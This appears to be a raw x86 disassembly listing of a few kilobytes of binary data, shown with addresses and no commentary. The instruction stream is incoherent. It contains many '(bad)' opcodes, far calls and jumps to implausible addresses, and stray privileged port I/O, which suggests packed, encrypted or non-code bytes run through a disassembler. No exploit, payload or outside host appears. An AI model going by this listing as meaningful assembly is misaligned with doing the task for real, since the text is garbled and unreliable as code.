  4171d8:	mov    edx,0xf13d7c70
  4171dd:	das    
  4171de:	jmp    0x41717b
  4171e0:	or     eax,0x9e2b19b9
  4171e5:	pop    edx
  4171e6:	psubd  mm4,QWORD PTR [edi]
  4171e9:	call   0x111c:0xf7c505f3
  4171f0:	test   BYTE PTR [ebp+edi*1-0x57d16201],cl
  4171f7:	out    dx,al
  4171f8:	mov    al,0x69
  4171fa:	fwait
  4171fb:	rcl    dh,1
  4171fd:	mov    esi,?
  4171ff:	and    al,BYTE PTR [esi+0x7d71c254]
  417205:	pop    edi
  417206:	mov    dh,0xe5
  417208:	jmp    0xc6088ba6
  41720d:	sub    DWORD PTR [ebx],0x6d52805d
  417213:	stos   DWORD PTR es:[edi],eax
  417214:	mov    esp,ebp
  417216:	mov    eax,0xaecd0b4a
  41721b:	mov    ebp,DWORD PTR [ebp+0x30af1c4b]
  417221:	sar    bh,1
  417223:	test   eax,0x6944014e
  417228:	inc    ebp
  417229:	gs fwait
  41722b:	in     al,0x7a
  41722d:	popf   
  41722e:	sub    al,0x85
  417230:	sub    eax,0xe50a4e64
  417235:	(bad)  
  417236:	cmp    ah,bl
  417238:	sahf   
  417239:	dec    esi
  41723a:	js     0x4172ba
  41723c:	rol    edi,1
  41723e:	add    dl,al
  417240:	or     BYTE PTR [ecx-0x9],0x1c
  417244:	mov    bl,0x99
  417246:	and    al,0xaa
  417248:	inc    esi
  417249:	shl    BYTE PTR [edx+0x64],0xe0
  41724d:	fsubr  DWORD PTR [eax+0x4167ae1a]
  417253:	mov    edi,0xbd5e4642
  417258:	clc    
  417259:	dec    edi
  41725a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41725b:	fidiv  WORD PTR [esp+ebx*8-0xe]
  41725f:	arpl   WORD PTR [ebx-0x3029ea15],di
  417265:	sahf   
  417266:	xchg   ebx,eax
  417267:	es sti 
  417269:	and    eax,0x64eb5d60
  41726e:	inc    eax
  41726f:	mov    ds:0x9b941751,al
  417274:	sti    
  417275:	(bad)  
  417276:	nop
  417277:	mov    ebp,0x44a4598
  41727c:	(bad)  
  41727e:	mov    WORD PTR [eax],es
  417280:	inc    edi
  417281:	(bad)  
  417282:	mov    edi,0x44990854
  417287:	adc    BYTE PTR [ecx],dh
  417289:	out    dx,al
  41728a:	pop    ebx
  41728b:	cmp    BYTE PTR [edx],0xe8
  41728e:	and    eax,0x15cda8f8
  417293:	mov    ds:0x46c86ef0,al
  417298:	xchg   esi,eax
  417299:	movlps xmm5,QWORD PTR [edi]
  41729c:	sar    BYTE PTR [eax-0x65f9085],1
  4172a2:	mov    edx,0x13831c74
  4172a7:	out    0xc,eax
  4172a9:	or     al,BYTE PTR [ebx+edx*1+0x58]
  4172ad:	arpl   WORD PTR [edx-0x123064ce],ax
  4172b3:	lods   al,BYTE PTR ds:[esi]
  4172b4:	inc    esi
  4172b5:	outs   dx,DWORD PTR ds:[esi]
  4172b6:	xor    BYTE PTR [ebx-0x63086d5c],ah
  4172bc:	int    0x97
  4172be:	and    al,0xf2
  4172c0:	mov    DWORD PTR [eax-0x515b1df4],esp
  4172c6:	stos   BYTE PTR es:[edi],al
  4172c7:	retf   0xd5b5
  4172ca:	xchg   esp,eax
  4172cb:	fnstsw WORD PTR [ebx-0x28257cad]
  4172d1:	cmp    edi,eax
  4172d3:	lods   al,BYTE PTR ds:[esi]
  4172d4:	cli    
  4172d5:	iret   
  4172d6:	and    cl,ch
  4172d8:	xchg   edx,eax
  4172d9:	and    DWORD PTR [edx-0x57c5d24c],ebx
  4172df:	mov    edi,0xeebb40a
  4172e4:	sti    
  4172e5:	sub    BYTE PTR [esi],0xc3
  4172e8:	repz push edx
  4172ea:	cld    
  4172eb:	sub    eax,0x79575f94
  4172f0:	dec    DWORD PTR [eax]
  4172f2:	and    eax,0x8ec690e6
  4172f7:	and    eax,0xd3adf205
  4172fc:	lock xchg edx,eax
  4172fe:	jp     0x417296
  417300:	pop    ecx
  417301:	nop
  417302:	mov    WORD PTR [ecx],?
  417304:	sahf   
  417305:	pusha  
  417306:	xor    dl,BYTE PTR [eax]
  417308:	cmp    al,0xd7
  41730a:	in     eax,0x4d
  41730c:	push   edx
  41730d:	ffree  st(7)
  41730f:	mov    cl,0x4e
  417311:	or     eax,0xbbb90072
  417316:	ja     0x4172a2
  417318:	(bad)  
  417319:	adc    al,0xd
  41731b:	push   ds
  41731c:	cmp    al,0x90
  41731e:	cmp    DWORD PTR [edx-0x7f],eax
  417321:	cdq    
  417322:	int    0xa3
  417324:	cmp    eax,0xd5e16cb3
  417329:	(bad)  
  41732a:	stc    
  41732b:	fwait
  41732c:	adc    eax,DWORD PTR [edi+0xa]
  41732f:	adc    ecx,DWORD PTR [ebp+0x11f40c52]
  417335:	cmp    DWORD PTR [eax-0x32],0xbb6b091a
  41733c:	cmp    BYTE PTR [edi+0x31bfe0e1],al
  417342:	das    
  417343:	jns    0x4173bf
  417345:	dec    ebp
  417346:	test   eax,0x2e7df644
  41734b:	iret   
  41734c:	call   0xaf3becba
  417351:	inc    esi
  417352:	pop    ebx
  417353:	cmp    BYTE PTR [esi+0x77],dl
  417356:	dec    ecx
  417357:	push   ebp
  417358:	push   ebp
  417359:	and    dh,cl
  41735b:	imul   ebp,DWORD PTR [eax],0x1dfb9236
  417361:	push   esp
  417362:	sar    BYTE PTR [esp+edx*1],0xd2
  417366:	fcmovnu st,st(1)
  417368:	and    bh,dh
  41736a:	push   cs
  41736b:	pushf  
  41736c:	outs   dx,DWORD PTR ds:[esi]
  41736d:	add    BYTE PTR [eax],dl
  41736f:	ins    BYTE PTR es:[edi],dx
  417370:	daa    
  417371:	cmp    eax,0xd1abd161
  417376:	neg    BYTE PTR [ecx]
  417378:	test   ebx,edx
  41737a:	aas    
  41737b:	add    BYTE PTR [edx+edx*4+0x54],0x1e
  417380:	dec    edx
  417381:	dec    edx
  417382:	add    edx,DWORD PTR [eax-0x648d7db2]
  417388:	mov    ah,0x7d
  41738a:	inc    edx
  41738b:	or     bl,BYTE PTR [edi+0x422c734c]
  417391:	scas   eax,DWORD PTR es:[edi]
  417392:	add    edx,ebx
  417394:	pop    ecx
  417395:	pusha  
  417396:	(bad)  
  417398:	mov    eax,0xdd46e805
  41739d:	iret   
  41739e:	mov    dl,0xb6
  4173a0:	hlt    
  4173a1:	sub    al,cl
  4173a3:	mov    esp,0x997bc999
  4173a8:	stc    
  4173a9:	stos   BYTE PTR es:[edi],al
  4173aa:	fistp  QWORD PTR [ecx-0x2a]
  4173ad:	test   al,0x75
  4173af:	and    eax,0x1d132866
  4173b4:	and    edx,DWORD PTR [edx]
  4173b6:	out    dx,eax
  4173b7:	pushf  
  4173b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173b9:	pusha  
  4173ba:	pushf  
  4173bb:	or     ebx,DWORD PTR [ebp-0x25]
  4173be:	mov    BYTE PTR [esi+0xfac6792],ah
  4173c4:	jb     0x4173d2
  4173c6:	lea    edx,[ecx-0x51]
  4173c9:	push   ecx
  4173ca:	dec    esp
  4173cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173cc:	shr    DWORD PTR [esi-0x12],0x74
  4173d0:	xchg   esi,eax
  4173d1:	enter  0x3323,0x27
  4173d5:	add    ebx,DWORD PTR [ebx+0x9]
  4173d8:	outs   dx,BYTE PTR ds:[esi]
  4173d9:	nop
  4173da:	lods   al,BYTE PTR ds:[esi]
  4173db:	mov    ds:0x66e67575,eax
  4173e0:	add    ah,BYTE PTR [eax]
  4173e2:	adc    eax,0xc3ada980
  4173e7:	adc    al,0x1e
  4173e9:	push   edx
  4173ea:	pop    esp
  4173eb:	adc    edi,DWORD PTR ds:0x1b4d0078
  4173f1:	pop    ds
  4173f2:	pushf  
  4173f3:	retf   0x38b3
  4173f6:	test   DWORD PTR [edi],ebx
  4173f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f9:	push   ds
  4173fa:	call   0x8c7bc01c
  4173ff:	icebp  
  417400:	pop    edx
  417401:	stc    
  417402:	iret   
  417403:	xchg   edx,eax
  417404:	mov    WORD PTR [ebx-0x34f6ba26],gs
  41740a:	call   0x9b5c:0x397ccd2d
  417411:	fsubr  DWORD PTR [eax-0x27]
  417414:	jmp    0x95564ca6
  417419:	xchg   esi,eax
  41741a:	lods   eax,DWORD PTR ds:[esi]
  41741b:	repz lock dec edx
  41741e:	inc    esp
  41741f:	push   cs
  417420:	push   eax
  417421:	in     eax,dx
  417422:	mov    WORD PTR [eax*1-0x53d43652],fs
  417429:	(bad)  
  41742a:	sub    ebp,DWORD PTR [ecx-0x48]
  41742d:	imul   esi,DWORD PTR [eax],0xbed72551
  417433:	dec    ecx
  417434:	and    esp,DWORD PTR [bp+di+0x21c2]
  417439:	and    DWORD PTR [ebp+ebp*1-0x3],ebp
  41743d:	xchg   BYTE PTR [ebx],dl
  41743f:	jne    0x4174b4
  417441:	mov    al,ds:0xd4ba3b58
  417446:	mov    al,ds:0x26d0c9ae
  41744b:	mov    cl,0x51
  41744d:	dec    ecx
  41744e:	frstor [ecx-0x5d]
  417451:	js     0x417461
  417453:	sti    
  417454:	push   0xfffffff7
  417456:	dec    edx
  417457:	repnz mov al,BYTE PTR [ebx-0x132bd13]
  41745e:	push   esi
  41745f:	mov    eax,0xe3c4075a
  417464:	mov    DWORD PTR [eax],ebp
  417466:	fld    DWORD PTR [ecx]
  417468:	pop    eax
  417469:	mov    edx,0xde9a3184
  41746e:	xchg   ebp,eax
  41746f:	rcr    BYTE PTR [edx+ebx*4],1
  417472:	or     DWORD PTR [esi-0x61],ebp
  417475:	and    bl,BYTE PTR [eax-0x62ced862]
  41747b:	jg     0x417466
  41747d:	xlat   BYTE PTR ds:[ebx]
  41747e:	xchg   ebx,eax
  41747f:	and    al,0x29
  417481:	lods   al,BYTE PTR ds:[esi]
  417482:	ds mov ah,0xb1
  417485:	test   ecx,ebp
  417487:	pop    es
  417488:	ins    BYTE PTR es:[edi],dx
  417489:	call   0x4251d313
  41748e:	fs add eax,0x9e23c793
  417494:	ins    DWORD PTR es:[edi],dx
  417495:	dec    esi
  417496:	scas   eax,DWORD PTR es:[edi]
  417497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417498:	popa   
  417499:	adc    DWORD PTR [esp+eax*4],ebx
  41749c:	mov    ebp,edx
  41749e:	sahf   
  41749f:	inc    ecx
  4174a0:	dec    ecx
  4174a1:	pop    es
  4174a2:	data16 loopne 0x4174ef
  4174a5:	sub    dl,BYTE PTR [eax-0xf108990]
  4174ab:	lds    ecx,FWORD PTR ds:0x4e1549e7
  4174b1:	xlat   BYTE PTR ds:[ebx]
  4174b2:	jns    0x417493
  4174b4:	mul    BYTE PTR [eax]
  4174b6:	leave  
  4174b7:	add    ah,ah
  4174b9:	mov    bl,0xd1
  4174bb:	fdivr  st(6),st
  4174bd:	sub    DWORD PTR ds:0x5e489f8,ecx
  4174c3:	stos   DWORD PTR es:[edi],eax
  4174c4:	push   cs
  4174c5:	cmp    al,0x33
  4174c7:	mov    ebp,0xd55138d1
  4174cc:	mov    ds:0x5f74e7f0,eax
  4174d1:	je     0x4174ba
  4174d3:	mov    bl,BYTE PTR ds:0x5dd4ed81
  4174d9:	xor    BYTE PTR [ebp-0xce56075],ah
  4174df:	jecxz  0x41749a
  4174e1:	popa   
  4174e2:	adc    al,0xb2
  4174e4:	out    0x3b,al
  4174e6:	sahf   
  4174e7:	les    edi,FWORD PTR [ecx+0xfc6e72]
  4174ed:	lahf   
  4174ee:	mov    ds:0x148e19da,al
  4174f3:	pop    esi
  4174f4:	and    eax,DWORD PTR [ecx-0x75]
  4174f7:	pusha  
  4174f8:	pop    ss
  4174f9:	cwde   
  4174fa:	mov    ecx,0x7a03ffa8
  4174ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417500:	pop    ss
  417501:	pop    edi
  417502:	psllw  mm0,QWORD PTR [edx]
  417505:	sub    BYTE PTR [esi+ecx*4+0x3b],ah
  417509:	inc    edx
  41750a:	push   0x7f
  41750c:	repz (bad) 
  41750e:	xchg   esp,eax
  41750f:	hlt    
  417510:	mov    al,ds:0x902be3d4
  417515:	jl     0x4174a2
  417517:	and    al,bh
  417519:	repz xlat BYTE PTR ds:[ebx]
  41751b:	and    bl,BYTE PTR [edx+edi*4-0x1a]
  41751f:	aam    0xb4
  417521:	xchg   BYTE PTR [esp+esi*8+0x5f8bf8ab],dh
  417528:	mov    dl,0xef
  41752a:	add    ebx,DWORD PTR [edi-0x70]
  41752d:	mov    bh,0x8a
  41752f:	jl     0x417531
  417531:	add    dl,BYTE PTR [edi+0x6f3f2d3d]
  417537:	leave  
  417538:	adc    ebx,DWORD PTR [edi+0x3abc55b1]
  41753e:	push   ecx
  41753f:	xchg   edx,eax
  417540:	rcl    DWORD PTR [esi],0x40
  417543:	test   DWORD PTR [eax-0x49],edx
  417546:	idiv   DWORD PTR [edi-0x31]
  417549:	or     dl,BYTE PTR [eax]
  41754b:	mov    BYTE PTR [ebx-0x5787c9da],dl
  417551:	lds    esi,FWORD PTR [eax-0x394058f]
  417557:	sahf   
  417558:	ror    DWORD PTR [edi-0x7bc95ac8],1
  41755e:	push   esi
  41755f:	xchg   edi,eax
  417560:	inc    edx
  417561:	sub    eax,ebp
  417563:	retf   
  417564:	lods   eax,DWORD PTR ds:[esi]
  417565:	pop    esp
  417566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417567:	fwait
  417568:	pop    edx
  417569:	scas   al,BYTE PTR es:[edi]
  41756a:	inc    esp
  41756b:	xchg   ebp,eax
  41756c:	jae    0x417565
  41756e:	push   0xffffffd9
  417570:	add    BYTE PTR [ecx-0x3c35ae9f],ah
  417576:	mov    al,0x36
  417578:	(bad)  [edx+0x4b8be409]
  41757e:	fs in  al,0xc8
  417581:	lods   eax,DWORD PTR ds:[esi]
  417582:	enter  0x6454,0x6b
  417586:	(bad)  [edx+ebx*8]
  417589:	push   0xffffff80
  41758b:	mov    dh,0x7d
  41758d:	addr16 xor al,0x63
  417590:	loopne 0x417520
  417592:	shr    BYTE PTR [ebx-0x69],1
  417595:	cmp    al,0xab
  417597:	adc    BYTE PTR ds:0xbf2b0258,ah
  41759d:	outs   dx,DWORD PTR ds:[esi]
  41759e:	pop    ds
  41759f:	fsub   DWORD PTR [ecx+edi*2+0x5b]
  4175a3:	(bad)  
  4175a4:	std    
  4175a5:	in     al,0x99
  4175a7:	dec    eax
  4175a8:	inc    esp
  4175a9:	fistp  WORD PTR [eax+0x3f2ccd6e]
  4175af:	or     ebp,DWORD PTR [edx-0x1f5ce477]
  4175b5:	icebp  
  4175b6:	nop
  4175b7:	inc    ebx
  4175b8:	mov    ebx,0xc5e3814
  4175bd:	cmp    edi,DWORD PTR ds:0x1908604
  4175c3:	aad    0xa9
  4175c5:	(bad)  [ebx]
  4175c7:	ja     0x417643
  4175c9:	repnz in al,dx
  4175cb:	mov    eax,ds:0x7b908713
  4175d0:	mov    ds:0x7bab995d,al
  4175d5:	xor    dh,dh
  4175d7:	aad    0x13
  4175d9:	shl    bl,1
  4175db:	test   al,0x79
  4175dd:	aad    0x4e
  4175df:	daa    
  4175e0:	(bad)  
  4175e1:	idiv   DWORD PTR [ebp-0x3dbddac2]
  4175e7:	icebp  
  4175e8:	jno    0x41761e
  4175ea:	sbb    al,0xbf
  4175ec:	xchg   esi,eax
  4175ed:	push   ss
  4175ee:	popa   
  4175ef:	xchg   ebp,eax
  4175f0:	push   eax
  4175f1:	fadd   QWORD PTR [edx]
  4175f3:	call   0xe481:0xecff8090
  4175fa:	je     0x417648
  4175fc:	into   
  4175fd:	dec    ebx
  4175fe:	cmp    eax,0xf5895d7b
  417603:	loop   0x417596
  417605:	jp     0x4175a2
  417607:	cli    
  417608:	and    BYTE PTR [eax+0x3de10b2c],cl
  41760e:	xlat   BYTE PTR ds:[ebx]
  41760f:	or     eax,0x8af73d97
  417614:	cmp    al,0x1
  417616:	lods   eax,DWORD PTR ds:[esi]
  417617:	(bad)  
  417619:	jbe    0x417691
  41761b:	push   eax
  41761c:	cli    
  41761d:	retf   
  41761e:	scas   al,BYTE PTR es:[edi]
  41761f:	fdiv   QWORD PTR [ecx-0x3b]
  417622:	call   0x162a753d
  417627:	hlt    
  417628:	and    al,0x81
  41762a:	lea    esi,[edi]
  41762c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41762d:	fild   WORD PTR [bx-0x22d4]
  417632:	inc    ebx
  417633:	in     al,dx
  417634:	out    0x62,eax
  417636:	into   
  417637:	inc    edi
  417638:	push   ecx
  417639:	cli    
  41763a:	mov    al,0xe
  41763c:	sbb    edi,DWORD PTR [edi+0x76]
  41763f:	cmp    eax,0x1fc56dd2
  417644:	push   eax
  417645:	xor    dl,BYTE PTR [edi-0x60ee209]
  41764b:	push   eax
  41764c:	dec    esi
  41764d:	test   eax,0x508b0e47
  417652:	xchg   ebp,eax
  417653:	mov    ah,0x35
  417655:	mov    dl,ah
  417657:	sbb    DWORD PTR [edx-0x5d49e5f3],edx
  41765d:	mov    ss,WORD PTR [ebx+0x77bf3bb5]
  417663:	daa    
  417664:	add    DWORD PTR [edi+0x195c67b5],esp
  41766a:	lahf   
  41766b:	jle    0x417647
  41766d:	out    0x8a,eax
  41766f:	inc    ebx
  417670:	aaa    
  417671:	repnz or dh,ah
  417674:	dec    ebx
  417675:	push   0x24
  417677:	xor    al,0x85
  417679:	pop    esi
  41767a:	push   ecx
  41767b:	pop    ds
  41767c:	cmp    DWORD PTR [esi-0x1d],esp
  41767f:	test   DWORD PTR [edx],esp
  417681:	sbb    ch,BYTE PTR [eax-0x360775d2]
  417687:	retf   0x1dae
  41768a:	sub    DWORD PTR [esi],edx
  41768c:	aas    
  41768d:	push   ecx
  41768e:	mov    al,ds:0x6e4c27ef
  417693:	or     ebx,DWORD PTR [ebx]
  417695:	jmp    0xe72afbc6
  41769a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41769b:	xchg   edx,eax
  41769c:	ret    0x5876
  41769f:	fs dec ebx
  4176a1:	jne    0x417647
  4176a3:	js     0x4176cd
  4176a5:	mov    al,0x17
  4176a7:	pop    edx
  4176a8:	push   esi
  4176a9:	pop    edx
  4176aa:	inc    ecx
  4176ab:	add    DWORD PTR [ebx-0x2a],esp
  4176ae:	sbb    al,0x44
  4176b0:	push   0xffffffde
  4176b2:	fwait
  4176b3:	stos   BYTE PTR es:[edi],al
  4176b4:	sub    BYTE PTR [eax+0xc],dh
  4176b7:	adc    bh,dl
  4176b9:	aam    0xd4
  4176bb:	dec    ecx
  4176bc:	push   ebp
  4176bd:	pusha  
  4176be:	add    eax,0x69956a54
  4176c3:	push   ecx
  4176c4:	add    DWORD PTR [esi],ebx
  4176c6:	push   edx
  4176c7:	cmp    BYTE PTR [esi+0x38],bl
  4176ca:	fs push edi
  4176cc:	mov    dh,0x1f
  4176ce:	aaa    
  4176cf:	pop    ds
  4176d0:	mov    al,0x8b
  4176d2:	xor    edi,DWORD PTR [ebp+0xd]
  4176d5:	sbb    BYTE PTR [edi-0x8],dh
  4176d8:	mov    dl,0x14
  4176da:	dec    ebx
  4176db:	cmp    al,0x74
  4176dd:	lea    ebp,[ebp-0x401b350]
  4176e3:	fsub   DWORD PTR [ebx]
  4176e5:	inc    ebp
  4176e6:	mov    ah,BYTE PTR [ebx]
  4176e8:	xor    eax,0xb6cdf1c0
  4176ed:	push   es
  4176ee:	mov    ah,ch
  4176f0:	enter  0xf6a4,0xf
  4176f4:	and    al,BYTE PTR [ebx]
  4176f6:	das    
  4176f7:	in     eax,0x8f
  4176f9:	(bad)  
  4176fb:	xchg   edi,eax
  4176fc:	push   edi
  4176fd:	jecxz  0x417778
  4176ff:	fnstcw WORD PTR [eax+0xf6086e6]
  417705:	mov    edx,DWORD PTR [edi-0x4157f36e]
  41770b:	addr16 lahf 
  41770d:	xchg   ecx,eax
  41770e:	popa   
  41770f:	adc    bl,BYTE PTR [edx]
  417711:	mul    DWORD PTR gs:[esi-0x73]
  417715:	ins    BYTE PTR es:[edi],dx
  417716:	lea    edi,ds:0x43bdcdb9
  41771c:	cmc    
  41771d:	lods   eax,DWORD PTR ds:[esi]
  41771e:	mov    DWORD PTR [esi-0x43],edi
  417721:	adc    ch,al
  417723:	(bad)  
  417724:	mov    bl,0x64
  417726:	fstp   QWORD PTR [edi]
  417728:	das    
  417729:	dec    eax
  41772a:	scas   eax,DWORD PTR es:[edi]
  41772b:	pop    ebx
  41772c:	stos   DWORD PTR es:[edi],eax
  41772d:	sub    eax,0x1d154102
  417732:	loope  0x41775b
  417734:	mov    DWORD PTR [ebp+ebp*8+0x43bd6ddf],edx
  41773b:	aad    0x78
  41773d:	pop    ss
  41773e:	adc    esi,DWORD PTR [ebx-0x69]
  417741:	rol    eax,1
  417743:	popa   
  417744:	mov    esp,0xcf450f8d
  417749:	cmp    eax,0x839409bb
  41774e:	jl     0x41774c
  417750:	mov    ds:0x4bc2379,al
  417755:	out    dx,al
  417756:	call   0xfab7:0xa1b61d09
  41775d:	mov    dl,BYTE PTR [edi]
  41775f:	in     al,0xa5
  417761:	add    DWORD PTR [edx+0x1a],ebx
  417764:	or     BYTE PTR [ecx+eax*1-0x1faf04a0],al
  41776b:	out    dx,eax
  41776c:	inc    esp
  41776d:	cs in  al,dx
  41776f:	cs test al,0x6f
  417772:	jge    0x41776a
  417774:	jmp    0x1ab:0x527d5379
  41777b:	push   0xf0c68881
  417780:	xor    DWORD PTR [esi],edx
  417782:	repz repz push esp
  417785:	mov    bl,0x2a
  417787:	int3   
  417788:	out    0xf4,al
  41778a:	rcl    cl,cl
  41778c:	mov    edx,0x6c2e89c8
  417791:	fsubr  DWORD PTR gs:[esi]
  417794:	mov    WORD PTR [eax],ss
  417796:	or     cl,BYTE PTR [ebp+0x2]
  417799:	jo     0x41772b
  41779b:	repnz pop ss
  41779d:	sar    BYTE PTR [ebx+0x74],cl
  4177a0:	fist   WORD PTR [ebp-0x5cb40dec]
  4177a6:	xchg   ebx,eax
  4177a7:	or     al,0xfa
  4177a9:	cmp    dh,ah
  4177ab:	pop    esi
  4177ac:	(bad)  
  4177ad:	sbb    dh,dl
  4177af:	std    
  4177b0:	loope  0x4177fd
  4177b2:	cmp    DWORD PTR [edx-0x1742a45e],esp
  4177b8:	mov    ch,0xc
  4177ba:	push   edx
  4177bb:	dec    esi
  4177bc:	fwait
  4177bd:	inc    edx
  4177be:	les    eax,FWORD PTR es:[esi-0x6a]
  4177c2:	pop    esi
  4177c3:	mov    ecx,0x4ccaff9d
  4177c8:	les    ebx,FWORD PTR [ecx*4-0x2e98fbd9]
  4177cf:	ret    
  4177d0:	mov    ch,0x32
  4177d3:	nop
  4177d4:	fadd   QWORD PTR [ebx+ebx*1-0x55]
  4177d8:	push   ebx
  4177d9:	out    0x12,eax
  4177db:	mov    ebx,eax
  4177dd:	ja     0x417849
  4177df:	cs dec esi
  4177e1:	call   0x5afc:0xce44e672
  4177e8:	adc    BYTE PTR [ebx+0xaf892df],0xcb
  4177ef:	inc    ebx
  4177f0:	pop    ecx
  4177f1:	out    dx,eax
  4177f2:	retf   0x75ae
  4177f5:	or     DWORD PTR [eax],0x24
  4177f8:	xchg   esp,esp
  4177fa:	dec    ebx
  4177fb:	pop    ss
  4177fc:	stc    
  4177fd:	clc    
  4177fe:	adc    BYTE PTR [edi-0x68],al
  417801:	shl    BYTE PTR [ecx-0x5a],cl
  417804:	lods   eax,DWORD PTR ds:[esi]
  417805:	push   0x6cc30d16
  41780a:	push   ebp
  41780b:	sbb    eax,0x9eff40a3
  417810:	es retf 0x1635
  417814:	sub    esi,DWORD PTR [ebp-0x13]
  417817:	push   edi
  417818:	mov    edi,0x40010182
  41781d:	mov    bl,0xc
  41781f:	inc    esp
  417820:	adc    dh,BYTE PTR [ebx]
  417822:	mov    ebp,0x4a0a2839
  417827:	(bad)  
  417828:	sbb    DWORD PTR [ebp-0x6e],esp
  41782b:	dec    ebx
  41782c:	xchg   edx,eax
  41782d:	cwde   
  41782e:	inc    ecx
  41782f:	retf   
  417830:	cs mov dl,0x90
  417833:	cmp    eax,0x93b7ff6d
  417838:	and    ecx,esi
  41783a:	out    dx,al
  41783b:	std    
  41783c:	imul   esp,DWORD PTR [edi],0xdf9802aa
  417842:	aas    
  417843:	cmp    al,0xfb
  417845:	sbb    ch,BYTE PTR fs:[esi+0x5c41905b]
  41784c:	pminsw mm4,QWORD PTR [edi-0x197951c8]
  417853:	sahf   
  417854:	int    0xbb
  417856:	xor    eax,0x5ee6dac7
  41785b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41785c:	(bad)  
  41785e:	scas   eax,DWORD PTR es:[edi]
  41785f:	cli    
  417860:	jmp    0x4178be
  417862:	mov    dl,0xb0
  417864:	(bad)  
  417865:	xlat   BYTE PTR ds:[ebx]
  417866:	pop    eax
  417867:	cmp    DWORD PTR [ebx-0x3baac3da],esp
  41786d:	and    bh,BYTE PTR [edx+0x7e6a6fc7]
  417873:	xchg   esp,eax
  417874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417875:	and    al,0x8
  417877:	xchg   ebx,eax
  417878:	xor    ebp,0x5a
  41787b:	int    0x11
  41787d:	pushf  
  41787e:	lods   al,BYTE PTR ds:[esi]
  41787f:	shl    ebp,cl
  417881:	inc    eax
  417882:	cmp    BYTE PTR [ecx+0x3a],dh
  417885:	adc    DWORD PTR [ecx-0x32],esi
  417888:	xchg   DWORD PTR [edx],edi
  41788a:	in     al,0x9a
  41788c:	inc    esp
  41788d:	inc    esp
  41788e:	in     eax,dx
  41788f:	cli    
  417890:	xchg   DWORD PTR [eax-0x78],esp
  417893:	dec    edx
  417894:	call   0x6134:0xef2d4428
  41789b:	sub    bh,0x3
  41789e:	push   cs
  41789f:	mov    ebp,0xeae0d5b8
  4178a4:	push   0x151b8eca
  4178a9:	ds call 0xb59d:0xe0e2a282
  4178b1:	or     dl,BYTE PTR [eax-0x1ac24bce]
  4178b7:	push   ebx
  4178b8:	pop    ds
  4178b9:	not    edi
  4178bb:	jl     0x41792c
  4178bd:	(bad)  
  4178be:	mov    ebx,0xd6a93974
  4178c3:	push   0xa30109c1
  4178c8:	mov    DWORD PTR [ebp+0x4f5dde16],eax
  4178ce:	push   edx
  4178cf:	cmp    esp,edi
  4178d1:	fdivp  st(4),st
  4178d3:	sbb    DWORD PTR [eax+0x23],ebx
  4178d6:	imul   ebx,DWORD PTR [edx-0x7faad966],0x3b4e3533
  4178e0:	push   es
  4178e1:	int    0xa7
  4178e3:	sub    eax,0x622fd49a
  4178e8:	pop    ebp
  4178e9:	daa    
  4178ea:	mov    bl,0x61
  4178ec:	shr    BYTE PTR [ecx+0x77],cl
  4178ef:	repz cmp al,0x7f
  4178f2:	mov    edx,DWORD PTR [ecx+0x6a]
  4178f5:	jmp    0x41788a
  4178f7:	add    cl,BYTE PTR [edx+0x61]
  4178fa:	iret   
  4178fb:	ret    
  4178fc:	xchg   edi,eax
  4178fd:	mov    eax,ds:0xdf4ccefe
  417902:	ret    0xe134
  417905:	lahf   
  417906:	sti    
  417907:	add    al,0xa0
  417909:	sbb    al,0xec
  41790b:	jecxz  0x417942
  41790d:	dec    ecx
  41790e:	in     al,0xf4
  417910:	outs   dx,DWORD PTR ds:[esi]
  417911:	or     al,0x8f
  417913:	pop    ecx
  417914:	clc    
  417915:	push   0x319dc754
  41791a:	nop
  41791b:	pop    esp
  41791c:	mov    edi,0x49d4c241
  417921:	mov    ch,0x3a
  417923:	sub    DWORD PTR [eax-0x7b895d4],eax
  417929:	jg     0x417915
  41792b:	jmp    0xb5a2da9c
  417930:	idiv   BYTE PTR [esi-0x66]
  417933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417934:	sti    
  417935:	push   ds
  417936:	jnp    0x4179a1
  417938:	push   eax
  417939:	(bad)  
  41793b:	lock jne 0x4178be
  41793e:	jno    0x4178c0
  417940:	mov    esp,0xcd9cb41b
  417945:	neg    BYTE PTR [eax]
  417947:	cdq    
  417948:	jae    0x41795e
  41794a:	push   0x9bdda2ab
  41794f:	mov    esi,0xb0c5ca69
  417954:	cmp    eax,0x186f07e4
  417959:	inc    esp
  41795a:	cmp    esp,ebx
  41795c:	jb     0x417961
  41795e:	dec    esp
  41795f:	mov    cl,ch
  417961:	cmp    BYTE PTR [eax],al
  417963:	cs xchg ebx,eax
  417965:	push   ecx
  417966:	data16 aam 0xfd
  417969:	pop    ecx
  41796a:	mov    ebp,0xf93d43c8
  41796f:	lods   eax,DWORD PTR ds:[esi]
  417970:	sti    
  417971:	ja     0x41797d
  417973:	sbb    ebp,ecx
  417975:	dec    esp
  417976:	cmp    al,0xf8
  417978:	shl    BYTE PTR [eax-0x18],1
  41797b:	or     edi,DWORD PTR [eax+0x7bde91e5]
  417981:	cdq    
  417982:	fdiv   DWORD PTR [edi+eiz*1+0x27ba72f3]
  417989:	jl     0x417912
  41798b:	retw   
  41798d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41798e:	inc    esp
  41798f:	adc    ecx,DWORD PTR [ebx]
  417991:	fisttp WORD PTR [edx+eiz*2]
  417994:	cmp    ch,BYTE PTR [edi+0x3]
  417997:	cmp    BYTE PTR [edi],dl
  417999:	neg    BYTE PTR [edx-0x1f]
  41799c:	lahf   
  41799d:	repz push esi
  41799f:	or     ecx,DWORD PTR es:[ebp+eax*1+0x1636c1cc]
  4179a7:	mov    esi,0x5fd095e0
  4179ac:	jb     0x4179ef
  4179ae:	sbb    esp,DWORD PTR [ebx+esi*1-0x66eb7b21]
  4179b5:	iret   
  4179b6:	fcmovnbe st,st(2)
